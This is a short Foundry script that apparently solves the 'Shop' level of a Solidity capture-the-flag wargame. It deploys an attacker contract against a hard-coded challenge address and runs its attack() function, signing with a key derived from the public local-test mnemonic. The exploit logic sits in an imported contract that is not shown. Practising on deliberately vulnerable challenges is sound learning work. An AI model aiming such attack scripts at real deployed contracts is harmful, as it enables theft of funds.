// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {Script} from "@forge-std/Script.sol";
import {Shop} from "@main/21_Shop.sol";
import {ShopAttacker} from "@main/21_ShopAttacker.sol";

contract SolveShopScript is Script {

    Shop shopChallenge = Shop( payable(address(0x8464135c8F25Da09e49BC8782676a84730C318bC)) );
    ShopAttacker shopAttacker;

    function run() public {
        // uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        // string memory mnemonic = vm.envString("MNEMONIC");

        // address is already funded with ETH
        string memory mnemonic ="test test test test test test test test test test test junk";
        uint256 attackerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 2); //  address = 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC

        vm.startBroadcast(attackerPrivateKey);

        shopAttacker = new ShopAttacker(address(shopChallenge));
        shopAttacker.attack();

        vm.stopBroadcast();
    }
}
